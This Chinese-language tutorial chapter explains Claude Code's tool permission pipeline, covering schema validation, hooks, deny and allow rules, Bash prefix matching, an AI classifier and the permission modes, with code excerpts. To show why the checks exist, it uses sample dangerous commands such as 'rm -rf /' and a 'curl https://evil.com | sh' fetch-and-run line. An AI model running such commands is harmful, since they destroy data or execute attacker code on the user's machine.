# 7-5 权限检查：工具执行前的守门人

> **本节目标**：Claude 发来 `Bash("rm -rf /")` 请求，Claude Code 不能直接执行——它需要先问用户同意。但权限检查不止"弹框问一下"这么简单：有白名单规则要匹配，有工具自定义的 `checkPermissions()` 要跑，有用户配置的 hooks 要执行，还有 AI 分类器要咨询。这一节追踪整个权限检查链条，弄清楚"允许执行"这个结论是怎么得出的。

---

## 权限检查的核心矛盾

一个 Agent 系统里，权限检查面对两个相互矛盾的需求：

1. **安全**：不能让 Claude 自动执行危险操作（删文件、推代码、发邮件）
2. **流畅**：频繁弹确认框会让 Agent 失去意义——用户选择信任 Claude，不是要当 Claude 的秘书

朴素方案是：所有写操作都问，所有读操作不问。

**问题**：`Bash("curl https://evil.com | sh")` 是"写"操作吗？`Bash("git push origin main")` 呢？`Read("/etc/passwd")` 只是"读"，但读敏感文件也可能是问题。

单凭"读/写"二分不足以描述权限需求。真实系统需要：

- **细粒度规则**：`Bash(prefix:git)` 允许所有 git 命令，`Bash(prefix:git push)` 只允许 push
- **多层决策**：规则、工具自定义逻辑、用户 hooks、AI 分类器——按顺序咨询，早期决定可以覆盖后期
- **多种权限模式**：默认模式问用户，`bypassPermissions` 模式直接允许，`dontAsk` 模式直接拒绝

---

## 权限检查的完整流程图

```
Claude 请求调用工具
        ↓
1. Schema 验证（Zod）
        ↓  失败 → 返回错误
2. validateInput()（工具自定义验证）
        ↓  失败 → 返回错误
3. runPreToolUseHooks()（用户配置的 PreToolUse hooks）
        ↓  hooks 可以直接 allow/deny，也可以修改输入
4. resolveHookPermissionDecision()
   └─ 如果 hook 已做决定 → 跳过 5
   └─ 否则走 hasPermissionsToUseTool()：
         ↓
5. hasPermissionsToUseToolInner()
   ├─ 检查 denyRules（黑名单）→ 直接 deny
   ├─ 检查 allowRules（白名单）→ 直接 allow
   ├─ tool.checkPermissions()（工具自定义权限逻辑）
   │   └─ BashTool：检查命令是否匹配 allow/deny 前缀规则
   ├─ 权限模式判断（bypassPermissions/dontAsk/auto/default）
   └─ 返回 allow / deny / ask
        ↓
6. 如果是 ask → 显示权限确认对话框（用户批准/拒绝）
   如果是 allow → 继续
   如果是 deny → 返回错误 tool_result
        ↓
7. tool.call()（真正执行工具）
        ↓
8. runPostToolUseHooks()（PostToolUse hooks）
        ↓
9. 返回 tool_result 给 Claude
```

这是一个**多层过滤器**——每一层都有机会拦截或放行。越早做决定（规则匹配），越快；越晚做决定（交给用户），成本越高。

## 第一层：Zod Schema 验证

**文件：[src/services/tools/toolExecution.ts](../src/services/tools/toolExecution.ts#L615-L680)**

```typescript
async function checkPermissionsAndCallTool(...) {
  // 第一步：Schema 验证
  const parsedInput = tool.inputSchema.safeParse(input)
  if (!parsedInput.success) {
    // Claude 传了不符合 Schema 的参数——直接返回错误
    // 注意：这不是权限问题，是调用格式问题
    let errorContent = formatZodValidationError(tool.name, parsedInput.error)
    
    // 特殊情况：工具是"延迟加载"的，Schema 没有发给 Claude
    // → 附加提示让 Claude 先用 ToolSearch 加载 Schema
    const schemaHint = buildSchemaNotSentHint(tool, messages, tools)
    if (schemaHint) errorContent += schemaHint
    
    return [errorMessage(toolUseID, errorContent)]  // 返回错误，不执行
  }
  
  // parsedInput.data 现在有正确的 TypeScript 类型
  // 后续代码可以安全地访问字段（command、timeout 等）
}
```

Schema 验证在整个流程的最前面，是最便宜的检查——纯内存操作，不需要 I/O。

失败的原因通常是 Claude 的模型输出了错误类型（比如把数字写成字符串）。`semanticNumber()` 和 `semanticBoolean()` 可以容忍这种情况（见 7-2 节），但如果类型差异太大（传了对象但期望字符串），还是会报错。

## 第二层：工具自定义验证 validateInput()

**文件：[src/services/tools/toolExecution.ts](../src/services/tools/toolExecution.ts#L683-L733)**

```typescript
// validateInput() 是可选的工具方法（不同于 checkPermissions）
const isValidCall = await tool.validateInput?.(parsedInput.data, toolUseContext)
if (isValidCall?.result === false) {
  // 参数通过了 Schema 验证，但业务逻辑上不合法
  // 例如：file_path 指向一个目录而不是文件
  return [errorMessage(toolUseID, isValidCall.message)]
}
```

`validateInput()` 和 `checkPermissions()` 的区别：

- `validateInput()`：检查参数是否"合理"（技术层面），失败直接报错，不询问用户
- `checkPermissions()`：检查操作是否"被允许"（权限层面），可能需要询问用户

比如 `Write` 工具的 `validateInput()` 可能检查文件路径是否在当前工作目录内，如果路径逃逸到工作目录之外，直接返回错误（不是权限问题，是无效调用）。

## 第三层：PreToolUse Hooks

**文件：[src/services/tools/toolExecution.ts](../src/services/tools/toolExecution.ts#L800-L863)**

```typescript
for await (const result of runPreToolUseHooks(
  toolUseContext, tool, processedInput, toolUseID, ...
)) {
  switch (result.type) {
    case 'message':
      // hook 产生了一条消息（进度信息或额外上下文）
      resultingMessages.push(result.message)
      break
    case 'hookPermissionResult':
      // hook 做了权限决定（allow/deny）
      // → 后续跳过 canUseTool 检查，直接用这个结果
      hookPermissionResult = result.hookPermissionResult
      break
    case 'hookUpdatedInput':
      // hook 没有做权限决定，但修改了输入参数
      // 例如：一个 hook 自动把相对路径转成绝对路径
      processedInput = result.updatedInput
      break
    case 'stop':
      // hook 要求完全停止执行（比如检测到危险操作）
      return [stopMessage(toolUseID)]
  }
}
```

### Hooks 的用途和设计

Hooks 是用户（或企业）在工具执行前后插入自定义逻辑的机制。用户在 `.claude/settings.json` 里配置：

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "my-security-scanner --check \"$CLAUDE_TOOL_INPUT\""
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "prettier --write \"$CLAUDE_FILE_PATH\""
          }
        ]
      }
    ]
  }
}
```

**PreToolUse hook** 在工具执行前运行，可以：
- 允许或拒绝工具调用
- 修改工具输入参数
- 产生额外的上下文信息

**PostToolUse hook** 在工具执行后运行，可以：
- 修改工具输出（比如格式化代码）
- 记录日志
- 触发副作用（比如触发 CI）

Hook 程序通过退出码和 stdout 传达决定：
- 退出码 0：通过（passthrough）
- 退出码 1：阻止（block）
- 退出码 2：阻止并停止整个 Agent（abort）
- stdout 输出 JSON：提供权限决定或修改后的输入

## 第四层：hasPermissionsToUseTool()

这是权限检查的核心，有两个关键类型：

**文件：[src/types/permissions.ts](../src/types/permissions.ts#L44-L46)**

```typescript
type PermissionBehavior = 'allow' | 'deny' | 'ask'
// allow: 直接允许
// deny: 直接拒绝  
// ask: 需要问用户
```

**文件：[src/utils/permissions/permissions.ts](../src/utils/permissions/permissions.ts#L473-L500)**

```typescript
export const hasPermissionsToUseTool: CanUseToolFn = async (
  tool, input, context, assistantMessage, toolUseID
): Promise<PermissionDecision> => {
  const result = await hasPermissionsToUseToolInner(tool, input, context)
  
  if (result.behavior === 'allow') {
    return result  // 快速路径：允许
  }
  
  // 权限模式影响 'ask' 的结果
  if (result.behavior === 'ask') {
    const appState = context.getAppState()
    
    switch (appState.toolPermissionContext.mode) {
      case 'dontAsk':
        // 不显示对话框，直接拒绝
        return { behavior: 'deny', message: DONT_ASK_REJECT_MESSAGE }
        
      case 'auto':
        // 用 AI 分类器决定（而不是问用户）
        return classifierDecision(...)
        
      // default: 继续返回 'ask'，后续显示对话框
    }
  }
  
  return result
}
```

### hasPermissionsToUseToolInner()：规则匹配

**文件：[src/utils/permissions/permissions.ts](../src/utils/permissions/permissions.ts#L123-L220)**

内层函数按优先级检查规则（伪代码）：

```typescript
function hasPermissionsToUseToolInner(tool, input, context) {
  // 1. deny rules 最高优先级（黑名单）
  const denyRule = getDenyRuleForTool(context, tool)
  if (denyRule) {
    return { behavior: 'deny', message: '...', decisionReason: { type: 'rule', rule: denyRule } }
  }
  
  // 2. bypassPermissions 模式：跳过所有权限检查
  if (context.mode === 'bypassPermissions') {
    return { behavior: 'allow', decisionReason: { type: 'mode', mode: 'bypassPermissions' } }
  }
  
  // 3. allow rules（白名单）
  const allowRule = toolAlwaysAllowedRule(context, tool)
  if (allowRule) {
    return { behavior: 'allow', decisionReason: { type: 'rule', rule: allowRule } }
  }
  
  // 4. 工具自定义权限逻辑
  const toolPermission = await tool.checkPermissions(input, context)
  if (toolPermission.behavior !== 'allow') {
    return toolPermission  // 工具说 ask 或 deny
  }
  
  // 5. 工具声明自己是只读的 → 允许
  if (tool.isReadOnly(input)) {
    return { behavior: 'allow' }
  }
  
  // 6. 剩余情况：需要问用户
  return { behavior: 'ask', message: `Claude wants to use ${tool.name}` }
}
```

**规则优先级**：deny rules > bypassPermissions > allow rules > 工具自定义 > isReadOnly > ask

注意：deny rules 是最高优先级，即使是 `bypassPermissions` 模式，也无法覆盖 deny rules。这是 Fail-Closed 原则的体现——黑名单永远生效。

## BashTool 的 checkPermissions()：命令分析

Bash 工具的 `checkPermissions()` 是权限系统里最复杂的部分，值得单独看。

**文件：[src/tools/BashTool/bashPermissions.ts](../src/tools/BashTool/bashPermissions.ts)**

BashTool 的权限检查做两件事：

### 1. 前缀规则匹配

用户可以配置 `Bash(prefix:git)` 允许所有 git 命令：

```json
// .claude/settings.json
{
  "permissions": {
    "allow": ["Bash(prefix:git)", "Bash(prefix:npm run)"]
  }
}
```

`checkPermissions()` 会把 `command` 分解成子命令（通过 `splitCommand()`），然后对每个子命令检查是否匹配任何 allow/deny 前缀规则。

```
command: "git add . && git commit -m 'fix'"
        ↓ 拆分
subcommands: ["git add .", "git commit -m 'fix'"]
        ↓ 对每个子命令检查规则
"git add ." → 匹配 Bash(prefix:git) → allow
"git commit -m 'fix'" → 匹配 Bash(prefix:git) → allow
全部匹配 → 整体 allow
```

```
command: "git add . && rm -rf temp/"
        ↓ 拆分
subcommands: ["git add .", "rm -rf temp/"]
        ↓ 对每个子命令检查规则
"git add ." → 匹配 Bash(prefix:git) → allow
"rm -rf temp/" → 没有匹配规则 → ask（需要询问）
有子命令需要询问 → 整体 ask
```

这是"子命令级别"的精细控制——不是整条命令 allow 或 deny，而是逐个子命令检查。

### 2. 投机性 AI 分类器（Speculative Classifier）

**文件：[src/services/tools/toolExecution.ts](../src/services/tools/toolExecution.ts#L740-L752)**

```typescript
// 在进入权限检查流程"之前"，就提前启动 AI 分类器
// 注意：这是"投机性"的——分类器可能用不上（如果规则匹配了就不需要）
if (tool.name === BASH_TOOL_NAME && 'command' in parsedInput.data) {
  startSpeculativeClassifierCheck(
    parsedInput.data.command,
    appState.toolPermissionContext,
    abortController.signal,
    options.isNonInteractiveSession,
  )
}
```

这是一个微妙的优化：在权限检查还没开始时，就把命令发给 AI 分类器异步分析。

为什么要提前启动？

因为权限检查流程需要时间（尤其是前置 hooks 可能要运行外部程序），AI 分类器也需要时间（需要额外的 API 请求）。如果串行执行：

```
[hooks 运行 300ms] → [规则检查 5ms] → [分类器 500ms] → 显示对话框或执行
总时间：~805ms
```

提前启动分类器后：

```
[hooks 运行 300ms]
[分类器 500ms   ]  ← 并行
                 → 两者都完成 → 决策
总时间：~500ms（取最长的那个）
```

## canUseTool()：权限检查 + UI 对话框

上面的 `hasPermissionsToUseTool()` 只负责"计算"权限决策（返回 allow/deny/ask）。

`canUseTool()` 是更上层的函数，负责"执行"这个决策：

**文件：[src/hooks/useCanUseTool.tsx](../src/hooks/useCanUseTool.tsx#L28-L191)**

```typescript
// 这是一个 React hook，在 REPL.tsx 里创建，通过 ToolUseContext 传给每个工具
const canUseTool: CanUseToolFn = async (tool, input, toolUseContext, ...) => {
  return new Promise(resolve => {
    // 1. 调用 hasPermissionsToUseTool 计算决策
    hasPermissionsToUseTool(tool, input, toolUseContext, ...).then(result => {
      
      if (result.behavior === 'allow') {
        // 直接允许，不显示 UI
        resolve(buildAllow(input, result.decisionReason))
        return
      }
      
      if (result.behavior === 'deny') {
        // 直接拒绝，不显示 UI
        resolve(result)
        return
      }
      
      // result.behavior === 'ask' → 需要显示对话框
      switch (permissionMode) {
        case 'auto':
          // AI 自动决策（TRANSCRIPT_CLASSIFIER 特性）
          // 不显示对话框，等分类器结果
          handleCoordinatorPermission(...)
          break
          
        default:
          // 默认模式：显示权限确认对话框
          handleInteractivePermission({
            ctx,
            description,  // 工具的自然语言描述
            result,        // 包含原因、建议等
            ...
          }, resolve)
      }
    })
  })
}
```

`handleInteractivePermission()` 的作用是把一个"权限确认请求"放进队列（`setToolUseConfirmQueue`），UI 层监听这个队列，把对话框显示出来。用户点"允许"或"拒绝"后，Promise 的 `resolve` 被调用，整个异步链条继续。

## 权限决策流转图

把整个流程画成状态机：

```
tool.call() 被请求
        ↓
Schema 验证
  ├─ 失败 → 返回 InputValidationError（不问用户）
  └─ 成功 ↓

PreToolUse hooks 运行
  ├─ hook: deny → 返回错误（不问用户）
  ├─ hook: allow → 跳过后续权限检查，直接执行
  └─ hook: passthrough ↓

hasPermissionsToUseToolInner()
  ├─ deny rule 命中 → 直接拒绝
  ├─ bypassPermissions 模式 → 直接允许
  ├─ allow rule 命中 → 直接允许
  ├─ tool.checkPermissions() → deny/ask
  ├─ isReadOnly → 允许
  └─ 其他 → ask

ask 路径：
  ├─ dontAsk 模式 → 直接拒绝
  ├─ auto 模式 → AI 分类器决策
  │     ├─ allow → 执行
  │     └─ deny → 拒绝并记录
  └─ default 模式 → 显示对话框 ────┐
                                    ↓
                               用户选择
                          ├─ 允许（一次）→ 执行
                          ├─ 总是允许 → 保存规则 + 执行
                          └─ 拒绝 → 返回错误 tool_result
                                    ↓
tool.call() 执行
        ↓
PostToolUse hooks 运行
        ↓
返回 tool_result
```

## PermissionDecision 类型：决策的载体

权限系统在各层之间传递的是 `PermissionDecision` 类型：

**文件：[src/types/permissions.ts](../src/types/permissions.ts#L174-L247)**

```typescript
// 允许
type PermissionAllowDecision = {
  behavior: 'allow'
  updatedInput?: Input      // 权限系统可以修改输入（比如规范化路径）
  userModified?: boolean    // 用户是否在对话框里修改了参数
  decisionReason?: PermissionDecisionReason  // 为什么被允许（用于 analytics）
}

// 需要询问
type PermissionAskDecision = {
  behavior: 'ask'
  message: string           // 给用户看的说明（"Claude 想要执行 rm -rf"）
  suggestions?: PermissionUpdate[]  // 建议的规则（"总是允许 git 命令"）
  pendingClassifierCheck?: PendingClassifierCheck  // 后台分类器检查状态
}

// 拒绝
type PermissionDenyDecision = {
  behavior: 'deny'
  message: string
  decisionReason: PermissionDecisionReason  // 为什么被拒绝
}
```

`decisionReason` 是个联合类型，记录了"谁做了这个决定"：

```typescript
type PermissionDecisionReason =
  | { type: 'rule'; rule: PermissionRule }       // 规则匹配
  | { type: 'mode'; mode: PermissionMode }        // 权限模式
  | { type: 'hook'; hookName: string }            // Hook 决定
  | { type: 'classifier'; classifier: string }    // AI 分类器
  | { type: 'safetyCheck' }                       // 安全检查
  | ...
```

这个记录很重要——用于 analytics（统计哪些规则被触发）、调试（为什么被拒绝）、以及生成对话框里的"为什么需要确认"说明。

## 权限模式（PermissionMode）

**文件：[src/types/permissions.ts](../src/types/permissions.ts#L16-L29)**

Claude Code 有多种权限模式，控制 `ask` 结果如何处理：

```typescript
type PermissionMode =
  | 'default'           // 标准模式：问用户
  | 'acceptEdits'       // 自动接受文件编辑（Read-only 工具不问，Edit/Write 不问，但 Bash 仍然问）
  | 'bypassPermissions' // 完全绕过权限检查（用于测试和受信任的自动化场景）
  | 'dontAsk'           // 拒绝所有需要确认的操作（只执行被 allow rules 明确允许的）
  | 'plan'              // 计划模式：只允许读操作，禁止写操作
  | 'auto'              // AI 自动模式：用分类器代替用户做决定
```

通过 CLI 参数设置：`claude --permission-mode bypassPermissions`

或在对话中用 slash command 切换：`/permissions`

## 本节小结

- 权限检查是一个多层过滤器：Schema 验证 → validateInput → PreToolUse hooks → 规则匹配 → 工具自定义 → canUseTool → 用户对话框
- `hasPermissionsToUseTool()` 计算权限决策（返回 allow/deny/ask），不直接操作 UI
- `canUseTool()` 是 React hook，负责把 `ask` 转化为真实的用户交互（对话框）
- deny rules 优先于所有其他规则，即使 `bypassPermissions` 也不能绕过
- BashTool 的 `checkPermissions()` 在子命令级别做规则匹配（一条复合命令的每个子命令独立检查）
- 投机性分类器（Speculative Classifier）在 hooks 还在运行时就提前启动，利用并行缩短总等待时间
- `PermissionDecision` 带有 `decisionReason`，记录"谁做了这个决定"，用于调试和 analytics
